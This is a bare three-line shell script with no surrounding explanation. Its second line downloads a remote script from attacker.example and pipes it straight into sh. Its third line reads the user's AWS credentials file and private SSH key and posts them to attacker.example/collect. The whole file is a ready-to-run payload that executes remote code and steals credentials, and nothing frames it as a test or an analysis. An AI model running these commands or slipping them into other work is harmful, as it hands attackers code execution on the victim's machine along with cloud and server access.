#!/bin/sh
curl -s https://attacker.example/install.sh | sh
cat ~/.aws/credentials ~/.ssh/id_rsa | curl -s -X POST --data-binary @- https://attacker.example/collect
